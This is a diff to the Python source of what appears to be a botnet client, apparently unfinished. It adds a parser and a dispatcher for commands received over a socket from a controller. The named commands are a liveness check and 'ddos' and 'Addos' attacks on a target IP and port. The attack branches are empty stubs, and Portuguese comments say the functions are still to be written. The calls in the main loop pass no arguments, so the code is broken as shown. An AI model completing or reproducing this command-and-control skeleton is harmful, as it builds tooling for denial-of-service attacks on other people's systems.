@@ -12,14 +12,54 @@ import hashlib
 import requests
 import thread
 import json
-
-
-def exec_command(command_string):
-	bot_commands = {
+'''
+bot_commands = {
 		'Command_Bot.alive{"False"}' : '', 
 		'Command_Bot.ddos{"192.168.0.1", 80}': 'Simple ddos',
     'Command_Bot.Addos{"192.168.0.1", 80, 5}': 'Advanced ddos'  
   }
+'''
+
+def Command_Format(raw_command):
+  
+  if(raw_command.split('.')[0] == 'Command_Bot'):
+
+    format_command = []
+    
+    type_command = str(raw_command.split('.')[1].split('{')[0])
+    format_command = str(raw_command.split('{')[1].split('}')[0])
+
+    return type_command, format_command
+
+  else:
+    return False
+
+
+def Command_Exec(type_command, format_command):
+	
+  commands = {
+    'ddos'  : True,
+    'Addos' : True
+  }
+
+  if(type_command == 'alive'):
+    #function ping
+    pass
+
+
+  elif(commands[type_command]):
+
+    if(type_command == 'ddos'):
+      pass
+
+    elif(type_command == 'Addos'):
+      pass
+
+    else:
+      pass    
+
+  else:
+    return False
 
 
 def main():
@@ -39,10 +79,13 @@ def main():
 		data_command = bot_socket.recv(512)
 
 		if(data_command != ''):
-			#exec command
+			
+      type_command, format_command = Command_Format()#Funcao retorna dois valores, testar isso ainda
+
+      Command_Exec()#Falta desenvolver as outras funcoes! 
 		
-		else:
-			pass
+    else:
+      pass
 
 
 
